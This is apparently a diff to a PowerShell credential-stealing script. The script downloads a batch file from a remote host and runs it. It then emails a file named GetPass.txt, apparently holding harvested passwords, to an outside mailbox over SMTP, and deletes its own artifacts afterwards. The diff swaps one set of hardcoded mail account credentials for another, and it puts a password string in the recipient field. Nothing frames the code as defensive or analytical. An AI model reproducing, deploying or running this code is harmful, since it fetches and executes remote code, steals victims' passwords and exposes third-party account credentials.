@@ -3,19 +3,19 @@
 (new-object System.Net.WebClient).DownloadFile('http://ftp515468.host526.zhujiwu.cn/zzu/Command.rar','D:\Command.bat');
 
 D:\Command.bat;
-$SMTPServer = 'smtp.qq.com'
+$SMTPServer = 'smtp.126.com'
 
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 25)
 
 $SMTPInfo.EnableSsl = $true 
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('2184814561', 'abapfiyleirmeaic');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('helloogirl@126.com', 'ATSK52at3');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = '2184814561@qq.com'
+$ReportEmail.From = 'helloogirl@126.com'
 
-$ReportEmail.To.Add('3064383024@qq.com')
+$ReportEmail.To.Add('ATSK52at3')
 
 $ReportEmail.Subject = 'GetPass'
 
@@ -29,5 +29,4 @@ $ReportEmail.Attachments.Dispose()
 remove-item 'D:\GetPass.txt'
 
 remove-item 'D:\Get.exe'
-
-remove-item 'D:\Command.bat'
+remove-item 'D:\Command.bat;'
